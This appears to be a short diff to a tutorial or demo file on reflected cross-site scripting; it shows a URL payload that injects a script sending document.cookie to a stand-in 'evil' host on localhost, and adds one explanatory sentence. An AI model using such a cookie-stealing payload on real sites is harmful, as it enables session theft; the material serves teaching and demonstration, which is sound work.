@@ -19,3 +19,5 @@ Open the browser and send a malicious request:
 ```
 http://localhost:3000?txid=TX999<script>new Image().src=`http://localhost:3666/evil?cookie=${document.cookie}`</script>
 ```
+
+The cookie information will be sent to the malicious destionation.
